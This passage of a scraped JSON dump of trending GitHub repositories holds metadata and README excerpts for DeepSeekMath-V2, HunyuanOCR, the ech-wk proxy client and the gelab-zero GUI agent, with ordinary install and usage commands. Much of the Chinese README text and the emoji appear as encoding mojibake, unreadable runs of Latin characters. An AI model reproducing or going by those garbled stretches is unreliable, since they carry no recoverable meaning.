them.\nTo maintain the generation-verification gap as the generator becomes stronger, we propose to scale verification compute to automatically label new hard-to-verify proofs, creating training data to further improve the verifier.\nOur resulting model, DeepSeekMath-V2, demonstrates strong theorem-proving capabilities, achieving gold-level scores on IMO 2025 and CMO 2024 and a near-perfect 118/120 on Putnam 2024 with scaled test-time compute.\nWhile much work remains, these results suggest that self-verifiable mathematical reasoning is a feasible research direction that may help develop more capable mathematical AI systems.\n\n## 2. Evaluation Results\n\nBelow are evaluation results on [IMO-ProofBench](https://github.com/google-deepmind/superhuman/tree/main/imobench) (developed by the DeepMind team behind DeepThink IMO-Gold) and recent mathematics competitions including IMO 2025, CMO 2024, and Putnam 2024.\nModel predictions are available in the `outputs` folder.\n\n**IMO-ProofBench**\n\n<p align=\"center\">\n  <img width=\"100%\" src=\"figures/IMO-ProofBench.png\">\n</p>\n\n\n---\n\n**Mathematics Competitions**\n\n<p align=\"center\">\n  <img width=41%\" src=\"figures/Competitions.png\">\n</p>\n\n## 4. Download & Quick Start\n\nDeepSeekMath-V2 is built on top of DeepSeek-V3.2-Exp-Base, which can be downloaded from [ğŸ¤— HuggingFace](https://huggingface.co/deepseek-ai/DeepSeek-Math-V2).\nFor inference support, please refer to [the DeepSeek-V3.2-Exp github repository](https://github.com/deepseek-ai/DeepSeek-V3.2-Exp).\n\n## 6. License\nThe use of DeepSeekMath-V2 models is subject to [the Model License](LICENSE).\n\n## 7. Citation\n\n```\n@misc{deepseek-math-v2,\n  author = {Zhihong Shao, Yuxiang Luo, Chengda Lu, Z.Z. Ren, Jiewen Hu, Tian Ye, Zhibin Gou, Shirong Ma, Xiaokang Zhang},\n  title = {DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning},\n  year = {2025},\n}\n```\n\n## 8. Contact\n\nIf you have any questions, please raise an issue or contact us at [service@deep",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:31.148687"
  },
  {
    "basic_info": {
      "name": "HunyuanOCR",
      "full_name": "Tencent-Hunyuan/HunyuanOCR",
      "owner": "Tencent-Hunyuan",
      "description": null,
      "url": "https://github.com/Tencent-Hunyuan/HunyuanOCR",
      "clone_url": "https://github.com/Tencent-Hunyuan/HunyuanOCR.git",
      "ssh_url": "git@github.com:Tencent-Hunyuan/HunyuanOCR.git",
      "homepage": null,
      "created_at": "2025-11-18T04:06:24Z",
      "updated_at": "2025-12-13T14:41:13Z",
      "pushed_at": "2025-12-04T02:46:14Z"
    },
    "stats": {
      "stars": 1260,
      "forks": 99,
      "watchers": 1260,
      "open_issues": 43,
      "size": 73571
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 22360
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "<div align=\"center\">\n\n[ä¸­æ–‡é˜…è¯»](./README_zh.md)\n\n</div>\n\n<div align=\"center\">\n\n# HunyuanOCR\n\n</div>\n\n<p align=\"center\">\n <img src=\"./assets/hyocr-head-img.png\" width=\"80%\"/> <br>\n</p>\n\n\n<p align=\"center\">\n<a href=\"https://huggingface.co/spaces/tencent/HunyuanOCR\"><b>ğŸ¯ Demo</b></a> |\n<a href=\"https://huggingface.co/tencent/HunyuanOCR\"><b>ğŸ“¥ Model Download</b></a> |\n<a href=\"https://arxiv.org/abs/2511.19575\"><b>ğŸ“„ Technical Report</b></a>\n</p>\n\n## ğŸ¤ Join Our Community\n\n<div align=\"center\">\n\n| Wechat Discussion Group | Discord Group |\n| :---: | :---: |\n| <img src=\"./assets/qrcode_for_hunyuanocr_wechat.jpg\" width=\"150\"> | [Join HunyuanOCR Discord](https://discord.gg/XeD3p2MRDk) |\n\n</div>\n\n## ğŸ”¥ News\n- **[2025/11/28]** ğŸ› ï¸ We fixed vLLM inference bugs and hyperparameter configuration issues such as system prompt. It is recommended to use the latest vLLM installation steps and the [inference script](https://github.com/Tencent-Hunyuan/HunyuanOCR/blob/main/Hunyuan-OCR-master/Hunyuan-OCR-vllm/run_hy_ocr.py) for performance testing. Currently, there is still a certain accuracy difference between Transformers and the vLLM framework (we are working on fixing this).\n- **[2025/11/25]** ğŸ“ Inference code and model weights publicly available.\n\n\n## ğŸ“– Introduction\n**HunyuanOCR** stands as a leading end-to-end OCR expert VLM powered by Hunyuan's native multimodal architecture. With a remarkably lightweight 1B parameter design, it has achieved multiple state-of-the-art benchmarks across the industry. The model demonstrates mastery in **complex multilingual document parsing** while excelling in practical applications including **text spotting, open-field information extraction, video subtitle extraction, and photo translation**.\n\n\n## âœ¨ Key Features\n\n- ğŸ’ª **Efficient Lightweight Architecture**: Built on Hunyuan's native multimodal architecture and training strategy, achieving SOTA performance with only 1B parameters, significantly reducing deployment costs.\n\n- ğŸ“‘ **Comprehensive OCR Capabilities**: A single model covering classic OCR tasks including text detection and recognition, complex document parsing, open-field information extraction and video subtitle extraction, while supporting end-to-end photo translation and document QA.\n\n- ğŸš€ **Ultimate Usability**: Deeply embraces the \"end-to-end\" philosophy of large models - achieving SOTA results with single instruction and single inference, offering greater efficiency and convenience compared to industry cascade solutions.\n\n- ğŸŒ **Extensive Language Support**: Robust support for over 100 languages, excelling in both single-language and mixed-language scenarios across various document types.\n\n<div align=\"left\">\n  <img src=\"./assets/hyocr-pipeline-v1.png\" alt=\"HunyuanOCR framework\" width=\"80%\">\n</div>\n\n\n\n\n## ğŸ› ï¸ Dependencies and Installation\n\n### System Requirements\n- ğŸ–¥ï¸ Operating System: Linux\n- ğŸ Python: 3.12+ (recommended and tested)\n- âš¡ CUDA: 12.9\n- ğŸ”¥ PyTorch: 2.7.1\n- ğŸ® GPU: NVIDIA GPU with CUDA support\n- ğŸ§  GPU Memory: 20GB (for vLLM)\n- ğŸ’¾ Disk Space: 6GB\n\n## ğŸš€ Quick Start with vLLM (â­ Recommended)\n\n- **[HunyuanOCR Usage Guide](https://docs.vllm.ai/projects/recipes/en/latest/Tencent-Hunyuan/HunyuanOCR.html)**\n\n### Installation\n```bash\npip install vllm>=0.12.0\npip install -r requirements.txt\n```\n\nNote: We suggest to install [cuda-compat-12-9](https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/):\n```bash\nsudo dpkg -i cuda-compat-12-9_575.57.08-0ubuntu1_amd64.deb\necho 'export LD_LIBRARY_PATH=/usr/local/cuda-12.9/compat:$LD_LIBRARY_PATH' >> ~/.bashrc\nsource ~/.bashrc\n# verify cuda-compat-12-9\nls /usr/local/cuda-12.9/compat\n```\n\n### Model Deploy\n```bash\nvllm serve tencent/HunyuanOCR \\\n    --no-enable-prefix-caching \\\n    --mm-processor-cache-gb 0 \\\n    --gpu-memory-utilization 0.2\n```\n\n### Model Inference\n```python\nfrom vllm import LLM, SamplingParams\nfrom PIL import Image\nfrom transformers import AutoProcessor\n\ndef clean_repeated_substrings(text):\n    \"\"\"Clean repeated substrings in text\"\"\"\n    n = len(text)\n    if n<8000:\n        return text\n    for length in range(2, n // 10 + 1):\n        candidate = text[-length:] \n        count = 0\n        i = n - length\n        \n        while i >= 0 and text[i:i + length] == candidate:\n            count += 1\n            i -= length\n\n        if count >= 10:\n            return text[:n - length * (count - 1)]  \n\n    return text\n\nmodel_path = \"tencent/HunyuanOCR\"\nllm = LLM(model=model_path, trust_remote_code=True)\nprocessor = AutoProcessor.from_pretrained(model_path)\nsampling_params = SamplingParams(temperature=0, max_tokens=16384)\n\nimg_path = \"/path/to/image.jpg\"\nimg = Image.open(img_path)\nmessages = [\n    {\"role\": \"system\", \"content\": \"\"},\n    {\"role\": \"user\", \"content\": [\n        {\"type\": \"image\", \"image\": img_path},\n        {\"type\": \"text\", \"text\": \"æ£€æµ‹å¹¶è¯†åˆ«å›¾ç‰‡ä¸­çš„æ–‡å­—ï¼Œå°†æ–‡æœ¬åæ ‡æ ¼å¼åŒ–è¾“å‡ºã€‚\"}\n    ]}\n]\nprompt = processor.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)\ninputs = {\"prompt\": prompt, \"multi_modal_data\": {\"image\": [",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:32.373794"
  },
  {
    "basic_info": {
      "name": "ech-wk",
      "full_name": "byJoey/ech-wk",
      "owner": "byJoey",
      "description": null,
      "url": "https://github.com/byJoey/ech-wk",
      "clone_url": "https://github.com/byJoey/ech-wk.git",
      "ssh_url": "git@github.com:byJoey/ech-wk.git",
      "homepage": null,
      "created_at": "2025-12-06T07:20:27Z",
      "updated_at": "2025-12-14T02:52:29Z",
      "pushed_at": "2025-12-12T10:40:10Z"
    },
    "stats": {
      "stars": 1228,
      "forks": 690,
      "watchers": 1228,
      "open_issues": 29,
      "size": 257
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 75305,
        "Go": 38017,
        "Shell": 13407,
        "JavaScript": 5184
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# ECH Workers å®¢æˆ·ç«¯\n\n[![GitHub release](https://img.shields.io/github/release/byJoey/ech-wk.svg)](https://github.com/byJoey/ech-wk/releases)\n[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)\n\nè·¨å¹³å°çš„ ECH Workers ä»£ç†å®¢æˆ·ç«¯ï¼Œæ”¯æŒ Windowsã€macOS å’Œ Linuxï¼ˆARM/x86ï¼‰ï¼Œæä¾›å›¾å½¢ç•Œé¢å’Œå‘½ä»¤è¡Œä¸¤ç§ä½¿ç”¨æ–¹å¼ã€‚\n\n## ğŸ“‹ ç›®å½•\n\n- [åŠŸèƒ½ç‰¹æ€§](#åŠŸèƒ½ç‰¹æ€§)\n- [ç‰ˆæœ¬æ›´æ–°](#ç‰ˆæœ¬æ›´æ–°)\n- [å¿«é€Ÿå¼€å§‹](#å¿«é€Ÿå¼€å§‹)\n- [å‘½ä»¤è¡Œä½¿ç”¨](#å‘½ä»¤è¡Œä½¿ç”¨)\n- [å›¾å½¢ç•Œé¢ä½¿ç”¨](#å›¾å½¢ç•Œé¢ä½¿ç”¨)\n- [è½¯è·¯ç”±éƒ¨ç½²](#è½¯è·¯ç”±éƒ¨ç½²)\n- [ç³»ç»Ÿè¦æ±‚](#ç³»ç»Ÿè¦æ±‚)\n- [æ•…éšœæ’é™¤](#æ•…éšœæ’é™¤)\n- [æŠ€æœ¯æ–‡æ¡£](#æŠ€æœ¯æ–‡æ¡£)\n\n## âœ¨ åŠŸèƒ½ç‰¹æ€§\n\n### æ ¸å¿ƒåŠŸèƒ½\n- âœ… **ECH åŠ å¯†** - åŸºäº TLS 1.3 ECH (Encrypted Client Hello) æŠ€æœ¯ï¼ŒåŠ å¯† SNI ä¿¡æ¯\n- âœ… **å¤šåè®®æ”¯æŒ** - åŒæ—¶æ”¯æŒ SOCKS5 å’Œ HTTP CONNECT ä»£ç†åè®®\n- âœ… **æ™ºèƒ½åˆ†æµ** - ä¸‰ç§åˆ†æµæ¨¡å¼ï¼šå…¨å±€ä»£ç†ã€è·³è¿‡ä¸­å›½å¤§é™†ã€ç›´è¿æ¨¡å¼\n- âœ… **IPv4/IPv6 åŒæ ˆ** - å®Œæ•´æ”¯æŒ IPv4 å’Œ IPv6 åœ°å€çš„åˆ†æµåˆ¤æ–­\n\n### å›¾å½¢ç•Œé¢åŠŸèƒ½\n- âœ… **å¤šæœåŠ¡å™¨ç®¡ç†** - æ”¯æŒå¤šä¸ªæœåŠ¡å™¨é…ç½®ï¼Œå¿«é€Ÿåˆ‡æ¢\n- âœ… **ä¸€é”®ç³»ç»Ÿä»£ç†** - è‡ªåŠ¨è®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œæ”¯æŒåˆ†æµæ¨¡å¼\n- âœ… **ç³»ç»Ÿæ‰˜ç›˜** - æœ€å°åŒ–åˆ°ç³»ç»Ÿæ‰˜ç›˜ï¼Œä¸å ç”¨ä»»åŠ¡æ \n- âœ… **å¼€æœºè‡ªå¯** - æ”¯æŒ Windows å’Œ macOS å¼€æœºè‡ªåŠ¨å¯åŠ¨\n- âœ… **é«˜ DPI æ”¯æŒ** - å®Œç¾æ”¯æŒé«˜åˆ†è¾¨ç‡æ˜¾ç¤ºå™¨\n- âœ… **å®æ—¶æ—¥å¿—** - æŸ¥çœ‹ä»£ç†è¿è¡ŒçŠ¶æ€å’Œæ—¥å¿—\n- âœ… **é…ç½®æŒä¹…åŒ–** - è‡ªåŠ¨ä¿å­˜é…ç½®ï¼Œä¸‹æ¬¡å¯åŠ¨è‡ªåŠ¨åŠ è½½\n\n### é«˜çº§åŠŸèƒ½\n- âœ… **è‡ªåŠ¨ IP åˆ—è¡¨æ›´æ–°** - è‡ªåŠ¨ä¸‹è½½å¹¶åº”ç”¨å®Œæ•´çš„ä¸­å›½ IP åˆ—è¡¨ï¼ˆIPv4/IPv6ï¼‰\n- âœ… **DNS ä¼˜é€‰** - æ”¯æŒè‡ªå®šä¹‰ DoH æœåŠ¡å™¨è¿›è¡Œ ECH æŸ¥è¯¢\n- âœ… **IP ç›´è¿** - æ”¯æŒæŒ‡å®šæœåŠ¡ç«¯ IPï¼Œç»•è¿‡ DNS è§£æ\n- âœ… **è·¨å¹³å°æ”¯æŒ** - Windowsã€macOSã€Linuxï¼ˆx86_64/ARM64ï¼‰\n\n## ğŸ†• ç‰ˆæœ¬æ›´æ–°\n\n### v1.3 æœ€æ–°ä¼˜åŒ–\n\n#### æ ¸å¿ƒåŠŸèƒ½å¢å¼º\n- **IPv6 å®Œæ•´æ”¯æŒ**\n  - æ–°å¢ IPv6 åœ°å€åˆ†æµåˆ¤æ–­åŠŸèƒ½\n  - è‡ªåŠ¨ä¸‹è½½å¹¶åŠ è½½ä¸­å›½ IPv6 IP åˆ—è¡¨ï¼ˆ`chn_ip_v6.txt`ï¼‰\n  - æ”¯æŒ IPv4/IPv6 åŒæ ˆç¯å¢ƒä¸‹çš„æ™ºèƒ½åˆ†æµ\n\n- **æ™ºèƒ½ IP åˆ—è¡¨ç®¡ç†**\n  - è‡ªåŠ¨æ£€æµ‹ IP åˆ—è¡¨æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–ä¸ºç©º\n  - æ–‡ä»¶ç¼ºå¤±æ—¶è‡ªåŠ¨ä» GitHub ä¸‹è½½æœ€æ–°åˆ—è¡¨\n  - æ”¯æŒ IPv4 å’Œ IPv6 åˆ—è¡¨çš„ç‹¬ç«‹ç®¡ç†\n  - åˆ—è¡¨æ¥æºï¼š[mayaxcn/china-ip-list](https://github.com/mayaxcn/china-ip-list)\n\n- **åˆ†æµé€»è¾‘ä¼˜åŒ–**\n  - åˆ†æµåˆ¤æ–­é€»è¾‘ç§»è‡³ Go æ ¸å¿ƒç¨‹åºï¼Œæ€§èƒ½æ›´ä¼˜\n  - æ”¯æŒåŸŸåè§£æåçš„å¤š IP åœ°å€åˆ¤æ–­\n  - æ”¹è¿›çš„äºŒåˆ†æŸ¥æ‰¾ç®—æ³•ï¼Œæå‡æŸ¥è¯¢æ•ˆç‡\n\n#### å‘½ä»¤è¡Œä½“éªŒæ”¹è¿›\n- **é»˜è®¤è¡Œä¸ºä¼˜åŒ–**\n  - å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼Œ`-routing` å‚æ•°é»˜è®¤å€¼æ”¹ä¸º `global`ï¼ˆå…¨å±€ä»£ç†ï¼‰\n  - æ›´ç¬¦åˆå‘½ä»¤è¡Œç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯\n  - GUI æ¨¡å¼ä¸å—å½±å“ï¼Œä»ä½¿ç”¨é…ç½®çš„é»˜è®¤å€¼\n\n- **å‚æ•°è¯´æ˜å®Œå–„**\n  - æ›´æ–°å¸®åŠ©ä¿¡æ¯ï¼Œæ˜ç¡®å„å‚æ•°çš„ä½œç”¨å’Œé»˜è®¤å€¼\n  - æ·»åŠ åˆ†æµæ¨¡å¼çš„è¯¦ç»†è¯´æ˜\n\n#### å…¼å®¹æ€§æå‡\n- **å‘åå…¼å®¹**\n  - ä¿æŒä¸æ—§ç‰ˆæœ¬é…ç½®æ–‡ä»¶çš„å…¼å®¹æ€§\n  - è‡ªåŠ¨è¿ç§»å’Œå‡çº§é…ç½®æ ¼å¼\n  - å¹³æ»‘å‡çº§ä½“éªŒ\n\n### å†å²ç‰ˆæœ¬\n\n#### v1.0\n- åˆå§‹ç‰ˆæœ¬å‘å¸ƒ\n- åŸºç¡€ä»£ç†åŠŸèƒ½\n- å›¾å½¢ç•Œé¢æ”¯æŒ\n- ç³»ç»Ÿä»£ç†è®¾ç½®\n\n## ğŸš€ å¿«é€Ÿå¼€å§‹\n\n### æ–¹æ³• 1: ä½¿ç”¨é¢„ç¼–è¯‘ç‰ˆæœ¬ï¼ˆæ¨èï¼‰\n\nä» [GitHub Releases](https://github.com/byJoey/ech-wk/releases) ä¸‹è½½å¯¹åº”å¹³å°çš„å‹ç¼©åŒ…ï¼š\n\n#### æ¡Œé¢ç‰ˆæœ¬ï¼ˆåŒ…å« GUIï¼‰\n- **Windows x64**: `ECHWorkers-windows-amd64.zip`\n- **macOS Intel**: `ECHWorkers-darwin-amd64.zip`\n- **macOS Apple Silicon**: `ECHWorkers-darwin-arm64.zip`\n- **Linux x86_64**: `ECHWorkers-linux-amd64.tar.gz`\n- **Linux ARM64**: `ECHWorkers-linux-arm64.tar.gz`\n\n#### è½¯è·¯ç”±ç‰ˆæœ¬ï¼ˆä»…å‘½ä»¤è¡Œï¼‰\n- **Linux x86_64**: `ECHWorkers-linux-amd64-softrouter.tar.gz`\n- **Linux ARM64**: `ECHWorkers-linux-arm64-softrouter.tar.gz`\n#### Dockerç‰ˆæœ¬ï¼ˆä»…æµ‹è¯•x86ï¼‰\n- **DockerHubä»“åº“**ï¼šhttps://hub.docker.com/r/cirnosalt/ech-workers-docker\n#### å®‰è£…æ­¥éª¤\n\n1. **è§£å‹æ–‡ä»¶**\n   ```bash\n   # Windows: è§£å‹åˆ°ä»»æ„ç›®å½•\n   # macOS/Linux: è§£å‹åˆ° /usr/local/bin æˆ–è‡ªå®šä¹‰ç›®å½•\n   tar -xzf ECHWorkers-linux-amd64.tar.gz\n   ```\n\n2. **è®¾ç½®æ‰§è¡Œæƒé™**ï¼ˆLinux/macOSï¼‰\n   ```bash\n   chmod +x ech-workers\n   chmod +x ECHWorkersGUI  # å¦‚æœä½¿ç”¨ GUI\n   ```\n\n3. **è¿è¡Œç¨‹åº**\n   - **Windows**: åŒå‡» `ECHWorkersGUI.exe` å¯åŠ¨ GUIï¼Œæˆ–è¿è¡Œ `ech-workers.exe` ä½¿ç”¨å‘½ä»¤è¡Œ\n   - **macOS/Linux**: è¿è¡Œ `./ECHWorkersGUI` å¯åŠ¨ GUIï¼Œæˆ–è¿è¡Œ `./ech-workers` ä½¿ç”¨å‘½ä»¤è¡Œ\n\n> **æ³¨æ„**: é¢„ç¼–è¯‘ç‰ˆæœ¬å·²åŒ…å«æ‰€æœ‰ä¾èµ–ï¼Œæ— éœ€å®‰è£… Python æˆ–ä»»ä½•å…¶ä»–è½¯ä»¶ã€‚  \n> é¦–æ¬¡è¿è¡Œ\"è·³è¿‡ä¸­å›½å¤§é™†\"æ¨¡å¼æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä¸‹è½½ IP åˆ—è¡¨æ–‡ä»¶ã€‚\n\n## ğŸ’» å‘½ä»¤è¡Œä½¿ç”¨\n\n`ech-workers` æ”¯æŒçº¯å‘½ä»¤è¡Œè¿è¡Œï¼Œé€‚åˆæœåŠ¡å™¨ç¯å¢ƒã€è½¯è·¯ç”±æˆ–æ— å›¾å½¢ç•Œé¢åœºæ™¯ã€‚\n\n### å‘½ä»¤è¯­æ³•\n\n```bash\nech-workers [é€‰é¡¹]\n```\n\n### å‚æ•°è¯´æ˜\n\n#### å¿…éœ€å‚æ•°\n\n| å‚æ•° | è¯´æ˜ | ç¤ºä¾‹ |\n|------|------|------|\n| `-f` | æœåŠ¡ç«¯åœ°å€ï¼ˆå¿…éœ€ï¼‰ | `-f your-worker.workers.dev:443` |\n\n#### å¯é€‰å‚æ•°\n\n| å‚æ•° | é»˜è®¤å€¼ | è¯´æ˜ | ç¤ºä¾‹ |\n|------|--------|------|------|\n| `-l` | `127.0.0.1:30000` | æœ¬åœ°ç›‘å¬åœ°å€ | `-l 0.0.0.0:30001` |\n| `-token` | ç©º | èº«ä»½éªŒè¯ä»¤ç‰Œ | `-token your-token-here` |\n| `-ip` | ç©º | æŒ‡å®šæœåŠ¡ç«¯ IPï¼ˆç»•è¿‡ DNSï¼‰ | `-ip 1.2.3.4` |\n| `-dns` | `dns.alidns.com/dns-query` | ECH æŸ¥è¯¢ DoH æœåŠ¡å™¨ | `-dns dns.alidns.com/dns-query` |\n| `-ech` | `cloudflare-ech.com` | ECH æŸ¥è¯¢åŸŸå | `-ech cloudflare-ech.com` |\n| `-routing` | `global` | åˆ†æµæ¨¡å¼ | `-routing bypass_cn` |\n\n#### åˆ†æµæ¨¡å¼è¯´æ˜\n\n| æ¨¡å¼ | å€¼ | è¯´æ˜ |\n|------|-----|------|\n| **å…¨å±€ä»£ç†** | `global` | æ‰€æœ‰æµé‡éƒ½èµ°ä»£ç†ï¼ˆé»˜è®¤æ¨¡å¼ï¼‰ |\n| **è·³è¿‡ä¸­å›½å¤§é™†** | `bypass_cn` | ä¸­å›½ IP ç›´è¿ï¼Œå…¶ä»–èµ°ä»£ç† |\n| **ç›´è¿æ¨¡å¼** | `none` | æ‰€æœ‰æµé‡ç›´è¿ï¼Œä¸è®¾ç½®ä»£ç† |\n\n> **æ³¨æ„**: \n> - ä½¿ç”¨ `bypass_cn` æ¨¡å¼æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä¸‹è½½ä¸­å›½ IP åˆ—è¡¨ï¼ˆIPv4/IPv6ï¼‰\n> - å¦‚æœ IP åˆ—è¡¨æ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¸ºç©ºï¼Œç¨‹åºä¼šè‡ªåŠ¨ä» GitHub ä¸‹è½½\n> - IP åˆ—è¡¨æ–‡ä»¶ä¿å­˜åœ¨ç¨‹åºç›®å½•ï¼š`chn_ip.txt`ï¼ˆIPv4ï¼‰å’Œ `chn_ip_v6.txt`ï¼ˆIPv6ï¼‰\n\n### ä½¿ç”¨ç¤ºä¾‹\n\n#### åŸºæœ¬ç”¨æ³•\n\n```bash\n# Windows\nech-workers.exe -f your-worker.workers.dev:443\n\n# macOS / Linux\n./ech-workers -f your-worker.workers.dev:443\n```\n\n#### æŒ‡å®šç›‘å¬åœ°å€\n\n```bash\n# ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£ï¼ˆé€‚åˆè½¯è·¯ç”±ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -l 0.0.0.0:30001\n\n# ä»…ç›‘å¬æœ¬åœ°ï¼ˆé»˜è®¤ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -l 127.0.0.1:30001\n```\n\n#### ä½¿ç”¨åˆ†æµæ¨¡å¼\n\n```bash\n# å…¨å±€ä»£ç†æ¨¡å¼ï¼ˆé»˜è®¤ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -routing global\n\n# è·³è¿‡ä¸­å›½å¤§é™†æ¨¡å¼ï¼ˆè‡ªåŠ¨ä¸‹è½½ IP åˆ—è¡¨ï¼‰\n./ech-workers -f your-worker.workers.dev:443 -routing bypass_cn\n\n# ç›´è¿æ¨¡å¼\n./ech-workers -f your-worker.workers.dev:443 -routing none\n```\n\n#### å®Œæ•´å‚æ•°ç¤ºä¾‹\n\n```bash\n./ech-workers \\\n  -f your-worker.workers.dev:443 \\\n  -l 0.0.0.0:30001 \\\n  -token your-token \\\n  -ip saas.sin.fan \\\n  -dns dns.alidns.com/dns-query \\\n  -ech cloudflare-ech.com \\\n  -routing bypass_cn\n```\n\n#### æŸ¥çœ‹å¸®åŠ©\n\n```bash\n./ech-workers -h\n# æˆ–\n./ech-workers --help\n```\n\n### åå°è¿è¡Œ\n\n#### Linux/macOS\n\n**ä½¿ç”¨ nohup:**\n```bash\nnohup ./ech-workers -f your-worker.workers.dev:443 -l 127.0.0.1:30001 > ech-workers.log 2>&1 &\n```\n\n**ä½¿ç”¨ screen:**\n```bash\nscreen -S ech-work",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:33.490644"
  },
  {
    "basic_info": {
      "name": "gelab-zero",
      "full_name": "stepfun-ai/gelab-zero",
      "owner": "stepfun-ai",
      "description": "GELab: GUI Exploration Lab. One of the best GUI agent solutions in the galaxy, built by the StepFun-GELab team and powered by Stepâ€™s research capabilities.",
      "url": "https://github.com/stepfun-ai/gelab-zero",
      "clone_url": "https://github.com/stepfun-ai/gelab-zero.git",
      "ssh_url": "git@github.com:stepfun-ai/gelab-zero.git",
      "homepage": "https://opengelab.github.io/",
      "created_at": "2025-11-28T14:42:44Z",
      "updated_at": "2025-12-13T18:06:25Z",
      "pushed_at": "2025-12-13T08:49:41Z"
    },
    "stats": {
      "stars": 1210,
      "forks": 102,
      "watchers": 1210,
      "open_issues": 14,
      "size": 124331
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 170902
      },
      "license": "MIT License",
      "topics": [
        "agent",
        "gui-agents",
        "phone-use-agent",
        "pua"
      ]
    },
    "content": {
      "readme": "![GELab-Zero Main Image](./images/main_en.png)\n\n> ğŸ‘‹ Hi, everyone! We are proud to present the first fully open-source GUI Agent with both model and infrastructure. Our solution features plug-and-play engineering with no cloud dependencies, giving you complete privacy control.\n\n<p align=\"center\">\n  <!-- <a href=\"https://github.com/stepfun-ai/gelab-zero\"><img src=\"https://img.shields.io/badge/ğŸ’»%20GitHub-Repository-black\" alt=\"GitHub\" /></a> -->\n  <a href=\"https://opengelab.github.io/\"><img src=\"https://img.shields.io/badge/ğŸŒ%20Website-Project%20Page-blue\" alt=\"Website\" /></a>\n  <a href=\"https://huggingface.co/stepfun-ai/GELab-Zero-4B-preview\"><img src=\"https://img.shields.io/badge/ğŸ¤—%20Hugging%20Face-GELab--Zero--4B--preview-orange\" alt=\"Hugging Face Model\" /></a>\n  <a href=\"https://huggingface.co/datasets/stepfun-ai/AndroidDaily\"><img src=\"https://img.shields.io/badge/ğŸ“š%20Hugging%20Face-AndroidDaily-yellow\" alt=\"Hugging Face Dataset\" /></a>\n  <a href=\"https://modelscope.cn/models/stepfun-ai/GELab-Zero-4B-preview\"><img src=\"https://img.shields.io/badge/ğŸ¤–%20Model%20Scope-GELab--Zero--4B--preview-blue\" alt=\"Model Scope\" /></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"./README.md\">English</a> |\n  <a href=\"./README_CN.md\">ç®€ä½“ä¸­æ–‡</a>\n</p>\n\n## ğŸ“° News\n\n* ğŸ **[Coming Soon...]**\n\n* ğŸ **[2025-12-12]** MCP-Server readyï¼š\n\n<!-- ### Step1 å¯åŠ¨ mcp server ä»¥æ”¯æŒå¤šè®¾å¤‡ç®¡ç†å’Œä»»åŠ¡åˆ†å‘ -->\n### Step1 Start MCP server to support multi-device management and task distribution\n\n```bash\n# enable mcp server\npython mcp_server/detailed_gelab_mcp_server.py\n```\n\n### Step2 Import MCP tools in Chatbox\n<!-- images/MCP-chatbox.png -->\n<div style=\"display: flex; align-items: center; justify-content: center; width: 80%; margin: 0 auto;\">\n  <img src=\"images/MCP-chatbox.png\" alt=\"MCP-Demo\" style=\"flex: 1; height: 400px; object-fit: contain; margin-right: 1px;\"/>\n</div>\n\n\n\n* ğŸ **[2025-12]** We thank the following projects and authors for providing quantization tools & tutorials: [GGUF_v1](https://huggingface.co/bartowski/stepfun-ai_GELab-Zero-4B-preview-GGUF), [GGUF_v2](https://huggingface.co/noctrex/GELab-Zero-4B-preview-GGUF), [EXL3](https://huggingface.co/ArtusDev/stepfun-ai_GELab-Zero-4B-preview-EXL3), [Tutorials_CN](http://xhslink.com/o/1WrmgHGWFYh), [Tutorials_EN](https://www.youtube.com/watch?v=4BMiDyQOpos)\n* ğŸ **[2025-11]** We release a lightweight **4B model** on [**Hugging Face**](https://huggingface.co/stepfun-ai/GELab-Zero-4B-preview) and [**Model Scope**](https://modelscope.cn/models/stepfun-ai/GELab-Zero-4B-preview).\n* ğŸ **[2025-11]** We release the tasks from the [**AndroidDaily**](https://huggingface.co/datasets/stepfun-ai/AndroidDaily) benchmark.\n* ğŸ **[2025-11]** We release the current **GELab-Zero** engineering infrastructure.\n* ğŸ **[2025-10]** Our [research](https://github.com/summoneryhl/gelab-engine) paper on **GELab-Engine** is accepted by **NeurIPS 2025**.\n\n\n## ğŸ“‘ Table of Contents\n\n- [ğŸ“– Background](#-background)\n- [ğŸ¥ Application Demonstrations](#-application-demonstrations)\n- [ğŸ“Š AndroidDaily](#-androiddaily-a-self-built-benchmark-close-to-daily-life)\n- [ğŸ† Open Benchmark](#-open-benchmark)\n- [ğŸš€ Installation & Quick Start](#-installation-quick-start)\n- [ğŸ“ Citation](#-citation)\n- [ğŸ“§ Contact](#-contact)\n\n## ğŸ“– Background\n\nAs AI experiences continue to penetrate consumer-grade terminal devices, mobile Agent research is at a critical juncture transitioning from \"feasibility verification\" to \"large-scale application.\" GUI-based solutions have emerged as the optimal approach for the current stage in addressing complex mobile ecosystems and achieving scalable Agent capabilities, thanks to their universal compatibility with all apps and zero-cost integration without requiring app vendor adaptation. However, due to the highly fragmented nature of mobile application ecosystems, getting GUI Agents to truly work across different brands and device models often faces numerous engineering challenges: multi-device ADB connections, dependency installation, permission configuration, inference service deployment, task recording and replay. This means Agent developers and MCP users need to handle substantial engineering infrastructure work, making it difficult to focus on strategic innovation.\n\nTo address this challenge, we are open-sourcing GELab-Zero to accelerate the innovation and application deployment of GUI Agents. It consists of two main components:\n\n- Plug-and-play complete inference engineering infrastructure that handles all the heavy lifting\n- A 4B GUI Agent model capable of 